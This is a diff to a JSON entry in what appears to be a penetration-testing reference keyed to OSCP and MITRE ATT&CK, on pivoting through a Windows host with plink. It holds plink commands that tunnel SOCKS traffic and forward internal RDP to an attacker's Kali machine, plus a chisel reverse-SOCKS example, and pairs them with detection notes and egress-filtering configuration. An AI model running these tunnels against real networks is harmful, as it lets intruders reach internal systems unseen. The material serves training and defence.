@@ -34,11 +34,11 @@
       "command": "plink -ssh -D 9050 ubuntu@10.129.15.50"
     },
     {
-      "label": "OSCP Ch18 \u2014 plink remote port forward from Windows to expose internal RDP via Kali",
+      "label": "OSCP Ch18 — plink remote port forward from Windows to expose internal RDP via Kali",
       "command": "C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>"
     },
     {
-      "label": "OSCP Ch18 \u2014 auto-accept host key on first connection (non-interactive)",
+      "label": "OSCP Ch18 — auto-accept host key on first connection (non-interactive)",
       "command": "cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>"
     }
   ],
@@ -75,7 +75,7 @@
   ],
   "exam": "exam-ok",
   "defense": {
-    "why_it_works": "plink.exe (PuTTY CLI) establishes SSH dynamic/port forwarding from a Windows pivot where a native SSH client is absent.",
+    "why_it_works": "plink (PuTTY's CLI) opens an SSH dynamic (SOCKS) tunnel from Windows, so traffic proxied through it reaches internal hosts via the pivot's network position.",
     "prerequisites": "plink on a Windows pivot and SSH access to a host that reaches the target network.",
     "impact": "SOCKS/port-forward pivoting from Windows into internal networks.",
     "detection": "[MITRE T1090.001] A compromised host relaying traffic between segments it shouldn't bridge; an unexpected listening port (SOCKS/forwarder) on the pivot; the pivot initiating connections to hosts/ports it never normally contacts; lateral flows that appear to originate from the pivot (NetFlow/east-west monitoring).",
@@ -86,8 +86,15 @@
       "HTB M12",
       "MITRE T1572"
     ],
-    "misconfiguration": "The network lacks proper segmentation \u2014 a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
-    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy \u2014 direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
-    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering \u2014 block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring \u2014 detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection \u2014 detect reverse tunnels in HTTPS streams"
-  }
+    "misconfiguration": "The network lacks proper segmentation — a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
+    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
+    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
+  },
+  "type": "command",
+  "variations": [
+    {
+      "label": "Reverse via plink -R",
+      "command": "plink -ssh -R <rport>:<int_target>:<int_port> <user>@<attacker>"
+    }
+  ]
 }
